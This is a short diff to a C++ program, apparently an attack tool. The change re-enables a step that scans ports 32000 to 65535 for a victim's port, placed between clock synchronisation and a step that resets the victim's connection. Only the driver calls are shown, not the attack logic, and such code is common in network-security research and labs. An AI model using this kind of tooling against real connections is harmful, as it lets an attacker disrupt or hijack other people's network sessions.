@@ -102,14 +102,14 @@ int main() {
     auto syncDelayMs = attacker.synchronizeClock();
     cout << "Synchronization delay: " << syncDelayMs.count() << "ms" << endl;
 
-    // printHeader("FINDING VICTIM'S PORT...");
-    // try {
-    //     auto victimPort = attacker.findPort(32000, 65535);
-    //     cout << "Victim's port: " << victimPort << endl;
-    // } catch (char const* err) {
-    //     cout << "Error: " << err << endl;
-    //     return 1;
-    // }
+    printHeader("FINDING VICTIM'S PORT...");
+    try {
+        auto victimPort = attacker.findPort(32000, 65535);
+        cout << "Victim's port: " << victimPort << endl;
+    } catch (char const* err) {
+        cout << "Error: " << err << endl;
+        return 1;
+    }
 
     printHeader("RESETING VICTIM'S CONNECTION...");
     try {
